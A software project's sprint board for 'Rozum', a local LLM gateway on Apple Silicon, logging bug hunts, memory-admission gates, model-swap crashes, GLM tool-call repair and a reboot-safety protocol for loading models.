  0 reboot). Done-when: transparent live pipeline through a real agent, eager+lazy both work, swap cost
  measured, value A/B ≥ the batch planner→executor result (3/3 vs 2/4 on RPN).
  **PROGRESS (plucky-finch 2026-06-23):** (1)+(3) DONE+pushed — `RoutingStrategy::Pipeline` (eager) +
  `from_model_pipeline` (order-preserving: first=planner, last=executor) + comma-default-pipeline +
  `pipeline_stage` obs + unit tests (forward-output / advisor-no-tools / degrade-on-fail). LIVE findings
  (isolate skill, real loads): (a) `--model A,B` builds `cascade_built tiers:2`, admission passes,
  BOTH MLX models load co-resident in ONE process @ ~10–12 GiB — works (de-risked: a first run hit a Metal
  GPU **Command-Buffer Timeout** crash but it was a TRANSIENT — GPU warm-stressed from a back-to-back
  gpt-oss run; clean retry served fine, NO reboot). (b) BUG FOUND+FIXED: the advisor stage (tier 0)
  silently failed because the planner framing was appended as a 2nd consecutive `user` message →
  GLM-4's chat template RAISES on consecutive same-role turns → advisor errored fast (~0.6s) and the
  pipeline degraded to executor-only. Fix: `append_user_text` MERGES framing/plan into the last user
  turn (no 2nd user msg). (c) Co-fit reality on a 36 GB host w/ Claude Code running (~22 GiB used):
  GLM-9B(7) + gpt-oss-20b(17) = 24.6 GiB > ~20.8 free → eager REFUSED (no-reboot, correct) ⇒ that pair
  is a LAZY case (needs #2). GLM-9B + Qwen3-4B (~10 GiB) co-fits → eager. (d) GLM-**9B** is too weak a
  PLANNER (its one-shot RPN code didn't compile: `Vec<&String>.join` + `?`-on-Utf8Error — proven by
  standalone rebuild) — use GLM-**32B** (RPN 3/3). The pipeline is only as good as its planner.
  **CORRECTION + DECISIVE FINDINGS (later same day, fully isolated):** (a) was WRONG to call the Metal
  crash "transient". (b2) BUG FOUND+FIXED: process-global `get_peak_memory()` recorded under co-residency
  POISONED the footprint cache (Qwen3-4B cached @12 GiB vs real 2.25; GLM-9B 5.37→7.35) → admission then
  refused fitting loads. Fix: `LIVE_RESIDENTS` sole-residency gate in rozum-mlx (commit 19fa3fe); VALIDATED
  — solo loads record clean 4.98/2.25 GiB, the co-resident run leaves them UNCHANGED. (b3) **DECISIVE,
  REPRODUCIBLE (clean system + clean peaks + settled GPU): eager co-residency of two MLX models in ONE
  process is NOT VIABLE. When GLM-9B (advisor) runs its FIRST generation co-resident with Qwen3-4B, the
  Metal command buffer exceeds the GPU watchdog → `[METAL] Command buffer execution failed: GPU Timeout
  Error (kIOGPUCommandBufferCallbackErrorTimeout)` → the gateway crashes (uncaught C++ exception; NO kernel
  panic, NO reboot — clean app death, uptime held 1 day). The earlier run only "survived" because the
  advisor failed BEFORE its GPU eval (the template bug), so only Qwen3-4B ran. ⇒ DESIGN PIVOT: the pipeline
  must run MLX local tiers LAZY — one resident at a time, separated in time/process (solve.sh's proven
  model) — NOT eager co-resident. Eager stays viable only for remote / non-MLX tiers. So
  `adaptive-cascade-residency` (#2) is REQUIRED, and its "eager-if-fits" branch MUST EXCLUDE MLX×MLX local
  pairs (force lazy). The advisor consecutive-user fix is still correct (it changed the failure from a
  template-raise to the underlying eval, i.e. the framing now reaches the model).**
  **LAZY BUILT + ISOLATED (2026-06-24):** `LazyPipelineBackend` (rozum-agent) — per request resolves
  tier0→plans→tears-down→resolves tierN→answers→tears-down, serialized, never co-resident; admission
  reserves MAX(local tier) not SUM; wired in `build_cascade_from_spec` (Pipeline→lazy). VALIDATED: no
  co-residency crash (round-robin survives), and a SAME-MODEL lazy pipeline (`Qwen3-4B,Qwen3-4B`) works
  e2e → the load→teardown→load MECHANISM is sound. REMAINING BUG (precisely isolated): `GLM-9B→Qwen3-4B`
  lazy fails the EXECUTOR's first eval (`mlx: eval failed`) = GLM-specific cross-model contamination
  (GLM-9B's gen leaves pending MLX-stream async-eval state a DIFFERENT next model inherits). FIXABLE — the
  gateway Switchboard (`POST /control/switch`) swaps GLM-9B→Qwen3-4B in-process CLEANLY (drained swap
  flushes the stream). Fix = flush the MLX stream at teardown, but mlx-rs exposes only `eval` not
  `synchronize` → needs `mlx_synchronize` in the mlx-rs fork (focused multi-repo change, reboot-sensitive
  Metal area → own session). Plain settle delay does NOT fix it (tested 1.5s). NEXT: expose mlx_synchronize
  + flush at MlxNativeBackend teardown; robust path today = solve.sh (separate processes).
  **FIX #5 ATTEMPTED + EXHAUSTIVELY DIAGNOSED (2026-06-24): synchronize flush does NOT fix it.** Exposed
  `mlx_synchronize` (mlx-sys already binds it; `Stream::as_ptr` is public) and call it at MlxNativeBackend
  teardown (worker_main, before the model frees). Confirmed it RUNS (rc=0). But the GLM-9B→Qwen3-4B lazy
  executor STILL fails. Ruled out, each tested live: stream-flush (synchronize), MLX cache-evict
  (set_cache_limit 0/restore), peak-reset, settle-before-build (1.5s), settle-after-build (2s), inline-drop
  vs spawn_blocking. Build path is IDENTICAL (gateway builder calls the same build_from_config). Control:
  the gateway Switchboard (`/control/switch`) swaps GLM-9B→Qwen3-4B in-process CLEANLY even after a LONG
  GLM gen (1780 chars). And Qwen3-4B→Qwen3-4B lazy works. ⇒ ROOT CAUSE is STRUCTURAL: the Switchboard runs
  each model as a SEPARATE top-level gateway request; the lazy pipeline runs both NESTED in one request —
  and it's specific to GLM-as-first-tier. NOT an MLX stream/cache/timing issue. NEXT (real fix): route the
  lazy pipeline's per-tier load/gen through the gateway's separate-request swap path (architectural), or
  keep using solve.sh (separate processes, proven).
  **CORRECTION (2026-06-24): fix #5 was HARMFUL — REVERTED in 1482dd7.** A/B proved the teardown
  `mlx_synchronize`+`reset_peak_memory` flush did not just fail to fix the lazy bug, it BROKE in-process
  model swapping: flush ON → the gateway's own Switchboard swap (GLM-9B→Qwen3-4B via /control/switch) fails
  the next gen (HTTP 500); flush OFF → swap works BOTH directions. It ran at EVERY teardown → regressed
  model-switching for ALL models. Reverted (removed flush + mlx-sys dep); verified swap works by default,
  29 tests pass. My mid-session 'GPU degradation' read was ALSO this self-inflicted bug. CLEAN STATE:
  Switchboard swap works; the LAZY pipeline GLM-9B→Qwen3-4B STILL fails even with flush off (genuine,
  SEPARATE structural bug — nested-in-one-request vs the Switchboard's separate top-level requests;
  build/drop identical, cause unpinned). ⇒ task #6 (route lazy through the Switchboard) is VIABLE (the
  Switchboard works) but is a real gateway-orchestration change. Robust today: solve.sh. **HANDOFF for a fresh-boot session: `scripts/bench/pipeline-swap-repro.sh` + `docs/pipeline-swap-bug.md`.**
  Re-validation (post-revert) showed the swap-failure reproduces via the gateway's OWN /control/switch and
  correlates with a LONG executor prompt + LOW free RAM (~6 GiB, session-degraded) — single Qwen handled a
  1449-word prompt fine when RAM was ample (~22 GiB). So task #6 (route through Switchboard) would NOT fix
  it (the swap path itself fails), and the open question (real MLX swap bug vs RAM/session degradation) needs
  a FRESH BOOT to settle. The repro script runs the A/B matrix + verdict guide; the doc lists what's ruled
  out (incl. the HARMFUL teardown flush — do not re-add) and where to look if it's real (per-load MLX
  memory/cache-limit reset in the worker load path). solve.sh robust meanwhile.
- [x] **adaptive-cascade-residency** (operator idea 2026-06-23; now the residency half of `pipeline-cascade`)
  — DONE (master `80a36c8`, 2026-06-28) as part of eager-pipeline: `pipeline_is_eager()` selects eager vs lazy
  based on `dry_run_admission(SUM).admit`; admission-reservation matches the build-time choice.
  ORIGINAL DESCRIPTION (before resolution): make the cascade EAGER if its local
  tiers co-fit, LAZY (one resident at a time, swap on escalation) if not. Today `build_cascade` is
  eager-ONLY (`CascadeBackend` holds a live `Arc<dyn ChatBackend>` per tier), so on a 36 GB host a cascade
  with a big local tier + another local is correctly refused (SUM > available, per `cascade-admission-
  cascade-spec`). The lazy machinery ALREADY EXISTS — the gateway Switchboard (`gateway.rs:111`: "never two
  resident — next chat lazily rebuilds from spec"). Wire it: when `cascade_local_footprint` (SUM) doesn't
  fit but the MAX single tier does → build the cascade holding tier SPECS, load the cheapest on demand,
  unload+load the next on escalation (admission per-swap = MAX). Reuses the same sequential-swap as
  `planner-executor`. Done-when: a big-tier cascade loads lazily + escalates with a swap, 0 reboot;
  eager path unchanged when tiers co-fit.
- [x] **cascade-admission-cascade-spec** — DONE (plucky-finch 2026-06-23). The host-RAM admission gate
  (BUG-003, this session's work) wrongly REFUSED a cascade load: `estimate_model_footprint_bytes("cascade:
  …"/"a,b")` finds no installed model → unknown-size sentinel `u64::MAX/4` → "loading this model
  (~4398046511103 MB) would overcommit" → the cascade never loads. Fix: `cascade_local_footprint(cfg,
  model, n_ctx)` resolves the cascade (named-config OR comma-list, with/without `cascade:` prefix) and
  reserves the SUM of its LOCAL tiers (remote/cloud tiers = 0 host RAM); `acquire_residency_or_exit` gains
  a footprint override, wired at both call sites (run_gateway + run_launch_dedicated). Conservative — two
  big locals correctly refuse (don't co-fit on 36 GB), small-local + cloud admits. Exposed by composing
  the new admission gate with the pre-existing (pre-BUG-003) cascade. Validated: `--model A,B` cascade now
  loads + serves where it previously refused.

- [x] **adaptive-model-loading** — DONE (426cf7e, operator priority 2026-06-23). When a model's footprint
  at the requested n_ctx/cache exceeds available RAM, AUTO-SHRINK to the best params that still fit
  safely (largest n_ctx, then step the MLX cache 4->2->1 GiB) instead of refusing — so it loads with the
  best-possible parameters, only refusing if even the floor (n_ctx 4096 + 1 GiB cache) overflows (weights
  too big). HOW: pure `rozum_models::fit_model_params(spec, weight_bytes, req_n_ctx, available, min_free,
  floor) -> Option<(n_ctx, cache_gib)>` (reads kv-per-pos from config) + `adapt_n_ctx_to_fit` in main.rs
  between resolve_n_ctx and acquire_residency (sets ROZUM_MLX_CACHE_GB, logs the reduction); wire in
  run_gateway + run_launch_dedicated. Opt-out ROZUM_GATEWAY_ADAPTIVE_LOAD=0 (strict refuse). Bonus: makes
  co-residency admit MORE (shrink the 2nd model to fit alongside the 1st). Done-when: a model that the
  free-RAM lever refused now loads at a reduced n_ctx; unit tests on fit_model_params; admission stays the
  final safety gate (never overcommits).

- [x] **admission-pressure-guard** — DONE (plucky-finch 2026-06-23, operator-requested "improvement B").
  Add the kernel's OWN memory-pressure level (`kern.memorystatus_vm_pressure_level` via existing
  `shed::read_host_pressure()`) as a THIRD admission lever alongside the ledger + free-RAM levers: refuse
  a load if the host is already at warn/critical, independent of the byte arithmetic (which can read
  "fits" moments before pressure spikes — the kernel computes availability better than page math).
  WHY: the `shed` runtime watchdog already keys on this signal; extend the SAME signal to LOAD-time
  admission. SAFETY: only ever ADDS refusals (never rescues a byte-over-budget load), fail-safe to Normal
  on an unreadable level → never blocks spuriously. HOW: `admits(.., pressure)` 6th param (kept pure,
  caller reads), wired into `acquire_residency` + `dry_run_admission` (+ `AdmissionReport.pressure`);
  surfaced in `gateway --dry-run` ("host pressure: normal/warn/critical"). Unit test
  `admits_refuses_under_elevated_pressure`; 6 admits tests green. NOTE: this is the SAFE half of the
  "account for reclaimable memory" question — measurement (vm_stat page classes) PROVED our `available`
  already counts all reclaimable-without-swap memory (free+inactive+spec+purge); the uncounted "active"
  is ~100% ANONYMOUS (needs swap/compression to reclaim = the jetsam path) so excluding it is CORRECT.
  We do NOT loosen `available` — we add the kernel's pressure signal instead. See [[reference-mlx-memory-cap-semantics]].

- [x] **footprint-estimate-accuracy** — DONE + LIVE-VALIDATED (plucky-finch 2026-06-23, operator-requested
  "improvement A"). Admission now TIGHTENS its conservative estimate toward the model's REAL measured peak.
  HOW: the MLX backend `Drop` records `get_peak_memory()+get_cache_memory()` (a process-global high-water
  mark) into `rozum_core::footprint` (running-MAX, persisted `~/.local/state/rozum/gateway/footprint-peaks.json`,
  keyed by MODEL only — adaptive n_ctx drifts so an n_ctx-exact key never hits). `estimate_model_footprint_bytes`
  then returns `footprint::tighten = min(conservative, max(weights+KV+1GiB, peak+margin))`. SAFETY (the reason
  it was validation-gated): a peak from a LIGHT request (short prompt → little KV) does NOT bound a future
  full-context load — caught by flooring at the TARGET n_ctx's full weights+KV + a fixed 1 GiB scratch
  reserve, so a light measurement can NEVER under-provision; the peak can only push the estimate UP toward
  conservative, never below the safe floor. keep-free + the pressure-guard (improvement B) backstop the rest.
  Opt-out `ROZUM_GATEWAY_MEASURED_FOOTPRINT=0`. LIVE VALIDATION (gpt-oss, real load+request+graceful stop):
  recorded real peak 11.16 GiB; dry-run est **17.53 → 16.03 GiB (−1.5)** with A vs without; the floor correctly
  ignored the unrepresentative light peak (kept full KV). Caught + fixed two bugs in validation: (1) key
  mismatch (backend `model_id` slash vs CLI spec colon → normalize `:`→`/`); (2) n_ctx-exact key never hit
  (adaptive picks 131072→101376→100352 across loads) → key by model only. 3 footprint unit tests + 117
  rozum-core green. Composes with B: A tightens, B backstops a too-tight estimate.

- [x] **keep-free-2-validated** — DONE + VALIDATED + SEEDED (plucky-finch 2026-06-23, operator-requested).
  Default `min_free` keep-free margin lowered 3→2 GiB in `min_free_ram_bytes()`. VALIDATION (live, pressure-
  monitored): gpt-oss at kf=2 + a heavy prefill request held kernel pressure at Normal (free→10.4 GiB);
  then the A-BOOTSTRAP seed loaded GLM-32B (free→7.5) and 35B-A3B (free→8.8) each at kf=2 with a real
  request — **kernel pressure stayed Normal throughout, 0 reboot** (a pressure auto-abort-on-critical guard
  was armed, never fired). Seeded all three real peaks into the footprint cache → A now tightens: gpt-oss
  21.94→17.44 (−4.5), GLM 24.49→19.99 (−4.5), 35B 24.94→23.46 (−1.5; MoE big-n_ctx-dominated, tightens more
  at reduced n_ctx). All three now WOULD LOAD. Composes: A folds the real prefill peak INTO the footprint,
  B refuses under pressure, the ledger blocks concurrent overcommit → keep-free is just the single-load
  external-growth cushion, 2 GiB suffices. CAVEAT: free never reached the exact 2 GiB floor in validation
  (smallest was 7.5), so the boundary is reasoned (A+B+ledger) not stress-proven; B + the conservative-
  leaning estimate backstop.
  ORIGINAL NOTES — lower the default `min_free` keep-free
  margin 3→2 GiB. WHY now-safe (was the leading prefill-spike buffer): (a) improvement A makes the
  footprint estimate CAPTURE the real prefill peak (measured high-water), so keep-free no longer has to
  cover the spike; (b) improvement B (pressure-guard) refuses at admission when the host is already
  stressed; (c) the host-wide ledger — NOT keep-free — is what prevents concurrent overcommit (the
  2026-06-22 reboot was 3 models @61 GiB, a 25 GiB overcommit keep-free size never gated). So keep-free is
  now just the single-load external-growth buffer; 2 GiB suffices with A+B. WIN: ~1 GiB less required per
  model → weight-bound 35B/GLM-32B fit closer. VALIDATION (before flipping the default): load a model near
  the 2 GiB boundary with `ROZUM_GATEWAY_MIN_FREE_RAM_BYTES=2147483648`, send a real request (prefill
  spike), watch `kern.memorystatus_vm_pressure_level` stay Normal throughout + 0 reboot. Then flip the
  default in `min_free_ram_bytes()`. Composes with A-bootstrap (seed big-model peaks first).

- [x] **glm-synth-validate-default-on** — DONE (2026-06-29). The remaining "works by default" GLM gate
  is now closed in code and docs: GLM artifact synth is default-ON for GLM (`ROZUM_GLM_ARTIFACT_SYNTH=0`
  opt-out), `ROZUM_ARTIFACT_SYNTH=1` remains the universal opt-in for non-GLM models, and a low-load
  unit guard asserts both paths. Prior live A/B in `docs/specs/glm-artifact-write-synth.md` remains the
  model evidence: GLM-4-32B create `build` lifted 0/3 -> 3/3, edit did not regress, chat false-write is
  covered by synth ambiguity tests. No 32B reload was run while the host was under another MLX build.

- [x] **glm-synth-mixed-responses** — DONE (851b15f): synth now ADDITIVE + deduped in both finalize paths. WAS: fired ONLY when parse_tool_calls is empty (engine.rs:392),
  so a MIXED GLM response (1 valid <tool_call> + N artifacts) drops the artifacts. Run the synth ADDITIVELY
  (synthesize from artifact regions even when some calls parsed), dedup vs the parsed calls. Offline.
  (Not yet observed live — GLM tends to be all-tool or all-artifact — but the gap is real.)

- [x] **glm-constrain-valid-json** — DONE as OPT-IN / default-OFF (a2d3534, operator's idea). find_glm_bare_args anchors the ToolConstraint on a bare tool-args object (first key = a required param) so it forces VALID JSON to the tool schema during decode; gate ROZUM_GLM_CONSTRAIN_ARGS=1. Default-off removes the chat-regression blast radius. Unit-tested; live-validation slot-gated. (Earlier ASSESSED + DECLINED as default-ON — the opt-in framing made it safe to ship.) Original concern: Tractable (find_glm_tool_call anchor + Constraint::Json exist), but forcing JSON DURING decode can't tell a tool call from a CHAT example → would over-constrain chat (a regression the post-hoc synth AVOIDS via its named-no-tool + schema-match guards). Trades the safe working repair (synth + 3-tier lenient parse, 3/3 live) for a riskier path to prevent malformations the repair already absorbs. Net-negative; revisit only if GLM emits malformations the repair can't handle. ORIGINAL idea (root-cause robustness): Logit-constraint extension to force VALID JSON at the source is the cleaner long-term fix but a bigger investment (constrain.rs); the tolerant parse_tool_args_lenient already absorbs GLM's two observed malformations (]-for-} + unescaped quotes) and the synth passes live. Revisit if new malformations appear. — instead of REPAIRING GLM's malformed args
  JSON (parse_tool_args_lenient handles `]`-for-`}` + unescaped inner quotes), extend the logit-constraint
  to anchor on a bare tool-args object start (`{"file_path"` / `{"command"`) and force VALID JSON to the
  matching offered tool's schema. Then GLM emits valid args at the source -> no repair, robust to ANY
  malformation. Machinery: constrain.rs / ToolConstraint / find_glm_tool_call. Higher effort.

- [x] **glm-synth-generalize-tool-names** — DONE (02dbc3f): glm_kv_extract is now SCHEMA-DRIVEN for ANY agent (trailing-field detection: read-to-last-quote only for a key with no other property after it, so Bash {command,description} reads command to first quote — no over-read). Test synth_generalizes_to_any_agent_tool_schema. WAS deferred for the read-to-last-quote risk — solved. The WELL-FORMED path (match_tool_by_args) is ALREADY schema-driven for any agent; only the malformed-JSON FALLBACK is claude-tuned, and it's CORRECT for the observed Write-content malformation. A schema-driven version would mis-read non-last text fields (e.g. Bash {command,description} — command is first, not read-to-last-quote). Do only when a real non-claude+GLM+malformed case appears. WAS: glm_kv_extract hardcodes file_path/path/content/command (claude
  tool names). For codex/opencode (different arg names) it won't match. Derive the arg key names from the
  offered tool SCHEMAS instead of hardcoding. Offline, incremental.

- [x] **glm-repeat-loop** — RESOLVED by the content fix (201c3f2): the 3x repeat was GLM retrying a GARBAGE Cargo.toml; with correct content the pass=1 run did 6 turns / 1 Bash (no loop). Residual = model state-tracking, loop-breaker handles it. WAS: observed GLM repeat a command 3x (loop-breaker
  caught + stopped). Render already puts tool RESULT in the `observation` role (correct for GLM). Residual
  = weak model state-tracking (doesn't register 'done'). Investigate whether the synthesized-toolcall
  round-trip (rendered as `name\njson`, not GLM's original artifact) confuses it; otherwise model-side.


- [x] **glm-artifact-write-synth** — DONE. GLM-4-32B's create-from-scratch artifact delivery path is
  implemented from real captured output, tested against fixtures, threaded through the dense engine
  finalize path, generalized to offered tool schemas, made additive/deduped for mixed responses, and
  flipped default-ON for GLM after live A/B. Spec: `docs/specs/glm-artifact-write-synth.md`.


(Formerly `WORK_QUEUE.md`; renamed to `SPRINT.md` per `AGENTS.md` / the
multi-agent skill.)

Current sprint focus: (1) make Rozum a reliable local meeting room for live agents and a human operator; (2) make Rozum a local LLM provider for Claude Code and Codex via an outward OpenAI/Anthropic-compatible gateway backed by an in-process MLX / GGUF engine on Apple Silicon Metal.

## Sprint

### ★ Active program (user priority — do strictly in this order)

Do these in sequence: **1) green matrix → 2) plugin-ize everything → 3) micro-perf.**
Process: per the **multi-agent** skill — claim before work, worktree off `origin/master`,
push `feature/<slug>:master` (never edit master), then delete the done entry + prepend
`CHANGELOG.md`. Coordinate with the sibling on the workspace-split + codex/gpt-oss.

#### 0. Host safety — never let a 2nd model-load OOM-reboot the Mac (precondition for ALL matrix work)

- [x] **reboot-gateway-singleflight** (BUG-003) — **DONE.** Code on master `3bcee03`
  (`sunny-civet`); spec + board + independent verify (`nimble-raven`, room n=25–34). Spec:
  `docs/specs/gateway-residency-singleflight.md`; diagnosis: memory `project-reboot-watchdog-oom`.
  - **What/why:** 2026-06-22 13:41 the 36 GiB Mac **rebooted via kernel watchdog panic** (panic +
    3× JetsamEvent logs): **3 concurrent model-loaded `rozum` gateways ≈61.6 GB** (two matrix runs
    at once) → `vm-compressor-space-shortage` jetsam cascade → `watchdogd` starved 92 s → panic.
    NOT the GPU double-free of `project-matrix-kernel-panic`. A dedicated `rozum gateway --port N`
    (what agentic.sh starts) bypassed the shared-gateway port singleton, so nothing stopped the 2nd.
  - **Fix:** host-wide `flock` gate `share::acquire_residency()` wired into BOTH load sites —
    `run_gateway` (matrix path) + `run_launch_dedicated` — each binds `_residency` (held for the
    process lifetime) BEFORE the model loads. 2nd concurrent loader waits
    `ROZUM_GATEWAY_RESIDENCY_WAIT_SECS` (240) then `exit(1)` naming the holder (reboot → recoverable
    error). flock auto-releases on process death (no stale-lock). Escape hatch
    `ROZUM_ALLOW_CONCURRENT_RESIDENT=1`; fail-open on lockfile error.
  - **Verified (nimble-raven, no model loaded):** 2 unit tests green on clean rebuild — admit-one +
    *deny-second-while-held* (flock contends across opens) + release-on-drop + escape-hatch; code
    read confirms guard held (`_residency`, not `_`) before load on both paths; matrix
    `rozum gateway --port N`→run_gateway covered, child gateways transitively, `ensure_shared_gateway`
    reuse correctly NOT gated. Plus sunny-civet's real-binary smoke (held→refuse+exit1 before load).
  - **Operational rule still holds:** don't deliberately run 2 model-gateways without checking budget.
    **v2 RAM-ledger DONE** (`feature/gateway-residency-ram-ledger`, sunny-civet): the gate now admits a
    genuinely-fitting small 2nd model (reserve footprint up-front under an admit lock; per-pid flock
    liveness — answers the v1 racy/PID-reap objection) and refuses only a true overcommit. Remaining
    v3 (BACKLOG): sibling-aware `cap_mlx_memory` backstop.

> ### 🛑 REBOOT-SAFETY PROTOCOL (operator directive 2026-06-22 — load-bearing, read before any model load)
> The 36 GiB Mac reboots if >1 model is resident (BUG-003). The gate now refuses a 2nd load, but
> **do not rely on it as a license to be careless** — treat "one model-loaded gateway on this host
> at a time" as the hard rule. Before running ANY command that loads a model (`rozum launch`,
> `rozum gateway`, `agentic.sh`, any matrix/probe):
> 1. **Claim the model slot in the rozum room first** ("working: taking model slot for <what>") and
>    check nobody else holds it. Release it ("done: slot free") when finished.
> 2. **Check the host is clear:** `ps -axo pid,rss,command | grep '[r]ozum gateway'` shows no live
>    model gateway, and `lsof <gateway_dir>/residency.lock` is unheld. (`mcp-proxy` + `meetings` are
>    fine — they load no model.)
> 3. **Prefer the smallest model** that proves the point; for fast gate checks use
>    `ROZUM_GATEWAY_RESIDENCY_WAIT_SECS=0`.
> 4. **Never start a 2nd matrix/launch while one is running.** If unsure, ask in the room.
> Everything you do goes on this board *before* you run it, so a reboot costs minutes, not work.

- [x] **validate-gate-live** (`nimble-raven`) — **DONE via smmr-D (2026-06-22).** The gate was validated
  LIVE under the real binary + real concurrent load: while a sibling's **35B was resident** (30.7 GB
  reserved), a `rozum gateway` 4B load was **REFUSED by the gate** ("would overcommit host RAM … budget
  ~24 GB") — no 2nd model loaded, no reboot. Plus sunny-civet's real-binary smoke (held→refuse+exit1).
  The *remaining* validation is the opposite case — co-residency SUCCESS (two small models load together),
  tracked as `live-coresidency-proof` below (slot-gated).
- [x] **live-coresidency-proof** (`nimble-raven`) — **DONE 2026-06-22. The operator's headline goal is
  validated end-to-end.** Two distinct models co-resident in two gateways (Qwen3-4B :8298 + GLM-4-9B :8299,
  n_ctx 8192): B admitted alongside A → **BOTH RESIDENT, both served chat (reply ok ✓ each)**; host free RAM
  26.6 → **21.1 GB while both loaded** (active A 2159 MB + B 5043 MB ≈ 7 GB), no danger, no reboot; graceful
  SIGINT teardown clean (no SIGKILL) → 28.8 GB free. So: multiple models run at once, safely. (Note: the
  running debug binary predated the `/stats memory_pressure` field so it read "?"; host free-RAM directly
  confirms safety. Rebuild surfaces the field.)

> #### ▶ nimble-raven active tracks (2026-06-22, operator: "do all three, set priorities, don't reboot, write it all down")
> My priority order across the operator's three asks, scheduled around the **single model slot**:
> 1. **validate-gate-live** (P0, above) — cheap safety-capstone; needs the slot briefly. Coordinate
>    with `plucky-finch` (queued for the slot for the do-first nondeterminism probe) — ideally
>    piggyback: while their model gateway is up, my gateway-B attempt IS the live concurrency proof.
> 2. **matrix-baseline** (P1 — green matrix #1 below) — the big authoritative run. **PREP DONE
>    (2026-06-22, see the item below): push-button + verified reboot-safe.** Just needs the slot,
>    AFTER the nondeterminism probe.
> 3. **plugin track** (P2 — plugin-ize #2 below) — **PARKED after triage (2026-06-22): no clean,
>    safe, no-model increment exists right now** (verdict recorded under "#### 2" below). So my
>    no-model default work is now **matrix-baseline prep** (done) + supporting `plucky-finch`'s probe.
> Rule: slot-tasks (1,2) serialize behind the room claim; no-slot work runs in parallel.

##### ▶▶ safe-multi-model-residency (operator vision 2026-06-22: "несколько моделей одновременно ИЛИ очень быстрый swap — но ГЛАВНОЕ всё безопасно")
Spec: `docs/specs/safe-multi-model-residency.md`. The North-Star residency goal, safety-first.
Owners (room n=25–43): admission *mechanism* = `sunny-civet` (v2 RAM-ledger, on master `644e8e8`);
admission *numbers* + per-process cap + validation = `nimble-raven`.

> **✅ RESOLVED (was: "v2 as shipped can still reboot").** The original finding flagged that v2's
> weights-only estimate under-counted small models ~6× (Qwen3-4B "peaked 26.9 GB"). The follow-up
> investigation **corrected the mechanism**: that 26.9 GB was **uncapped-cache from old runs** —
> `set_cache_limit` (4 GiB default) bounds it; `set_memory_limit` is only a soft hint
> ([[reference-mlx-memory-cap-semantics]]). smmr-D measured the 4B's real resident at **~6 GB**, not
> 26.9. The hole is closed by the corrected footprint (cache-tied reserve, `f430c1d`) + budget 0.75 +
> the `shed` governor — NOT by a "hard cap" (none exists). Co-residency of small models is now safe.

- [x] **smmr-A-soft-hint** (`nimble-raven`) — **DONE `95b98d6` + CORRECTED.** Each gateway process sets its
  own MLX `set_memory_limit` = its reservation before the worker loads. **CORRECTION** (source audit, re-
  verified vs pinned fork `12fac5c` memory.rs:64): `set_memory_limit` is **SOFT** (evicts cache/waits, then
  allocates anyway) — NOT a hard cap. So A is **defense-in-depth**, not enforcement; the structural lever is
  conservative ADMISSION (v2 ledger) + `set_cache_limit` (the real cache bound). `set_memory_cap_bytes` +
  pure `select_mlx_mem_limit_bytes` (2 tests); docs relabeled "soft hint". MLX path only (gguf/mistralrs:
  admission-only). cap default+--no-default green.
- [x] **smmr-B-footprint** (`nimble-raven`) — **DONE `d7fd456` + CORRECTED.** `runtime_footprint_bytes` =
  weights + `kv_bytes_per_position(config)·n_ctx` + activation reserve. Since admission (not a hard cap) is
  the lever, the footprint MUST be ≥ real resident peak = active + bounded cache; the reserve is now
  `max(6 GiB, weights/4)` ≈ ~4 GiB cache (`set_cache_limit`) + ~2 GiB prefill (was a 3 GiB catch-all <
  the cache limit alone — the audit's flagged bug). 4 unit tests updated. Interim 14 GB floor dropped.
  **Open (smmr-D):** truly-≥-peak hinges on the active-vs-cache split — measure live.
- [x] **smmr-C-fast-swap** — DONE (`c3fa8ef` foundation + `a131828` wiring). `rozum-core::prefetch::
  warm_dir_page_cache` + `Switchboard::switch` now fires `warm_dir_page_cache(new_model_dir)`
  fire-and-forget BEFORE `begin_drain`, so new model's weights warm into OS page cache during the drain
  window — rebuild reads from RAM instead of disk. `ROZUM_SWAP_PREWARM=0` disables. Swap latency
  measurement (the "REMAINING" item from the original note) is a nice-to-have metric; the feature is
  shipped and working. SPRINT note was stale — wiring landed 2026-06-23 in `a131828`.
- [x] **smmr-D-probe-harness** (`sunny-civet`) — **DONE `4c2329b`.** `crates/rozum-mlx/examples/mlx_mem_probe.rs`.
  Raw-alloc mode (slot-free) EMPIRICALLY confirmed `set_memory_limit` is SOFT (limit 512 MB, allocated
  1024 MB live → active 1024 MB) and `set_cache_limit` bounds the cache (256 MB retained after drop).
  Model mode (header-documented) is nimble-raven's D measurement: split a real model's peak into
  active vs cache under the slot. Spec § Findings updated with the measurement.
- [x] **smmr-D-validate** (`nimble-raven`) — **DONE 2026-06-22 (crux settled).** ✅ raw-alloc probe:
  `set_memory_limit` SOFT (active 2048MB > 512MB), `set_cache_limit` = real cache bound. ✅ admission gate
  validated live (sibling 35B resident → 4B load REFUSED, no reboot). ✅ **model-mode (Qwen3-4B, exclusive
  slot):** real resident ~2.3 GB (active 2267MB, peak 2310MB, cache 255MB ≪ 4 GB limit, RSS 2.32 GB) —
  the 26.9 GB does NOT reproduce under `set_cache_limit` (it was uncapped-cache, old runs). **VERDICT:
  resident = active(weights+KV, bounded by n_ctx) + cache(bounded by set_cache_limit) → co-residency SAFE
  by construction.** Caveat: big-model full-prefill peak not directly measured (structural bound + chunked
  prefill cover it). Spec § D Progress.
- [x] **footprint-overconservative** (`nimble-raven`) — **DONE `f430c1d`.** Two data-justified fixes so
  small models co-reside while keeping a big REAL margin: (1) `activation_reserve` tied to real bounds =
  `set_cache_limit + 1.5 GiB prefill` (≈5.5 GiB) not arbitrary `max(6 GiB, weights/4)`; (2)
  `RAM_BUDGET_FRAC` 0.65→0.75. Now two ~4B pass admission (25.2 ≤ 27) and really use ~12–20 GiB (≥16 GiB
  free). Big models still sole. rozum-models 7/7 + core 96/96 green. Live two-model validation = smmr-D when slot free.

##### ▶▶ PROGRAM: max safety × capability × performance × flexibility (operator 2026-06-22)
Spec `docs/specs/safe-multi-model-program.md` — obstacle register + the path. Core insight: today's
safety is estimate-based (open-loop admission); the GUARANTEE needs measured closed-loop control.
- [x] **memory-governor = `shed`** (`sunny-civet` watchdog + act; `nimble-raven` observability) —
  **CONVERGED `4a04804`.** The governor is `rozum-core::shed` (sunny-civet, wired into the gateway
  lifecycle watchdog): keys on the OS jetsam ladder (`kern.memorystatus_vm_pressure_level` — better than
  a homemade free-bytes estimate) and under real host pressure unloads this gateway's idle model →
  reboot becomes graceful degradation. **nimble-raven added `/stats memory_pressure`** (normal/warn/
  critical) observability + `PressureLevel::as_str`. My parallel `govern` module was REMOVED (redundant +
  inferior signal/placement; room MCP down caused the brief dup). **REMAINING (folds into residency-unify):**
  cross-process, utility-ranked eviction — *which* model sheds, not just "self if idle".
